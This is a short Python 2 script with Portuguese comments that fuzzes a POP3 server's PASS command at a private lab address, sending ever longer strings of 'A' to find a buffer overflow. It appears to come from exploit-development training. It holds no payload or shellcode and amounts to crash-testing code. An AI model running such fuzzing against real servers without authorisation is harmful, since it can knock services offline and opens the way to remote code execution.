#!/usr/bin/python
import socket

buffer=["A"] 	#caracter que sera enviado
contador=100
while len(buffer) <= 100:
	buffer.append("A"*contador)
	contador=contador+200 #vai enviar de 200 em 200 bytes / startando em 100

for string in buffer:
	print "Fuzzing em PASS com %s bytes" %len(string)  #dessa forma ele nao mostra todos os A's na tela, a saida fica melhor
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.2.140",110))
	s.recv(1024)
	s.send('USER usuario\r\n')
	s.recv(1024)
	s.send('PASS '+string+'\r\n')
	s.send('QUIT\r\n')
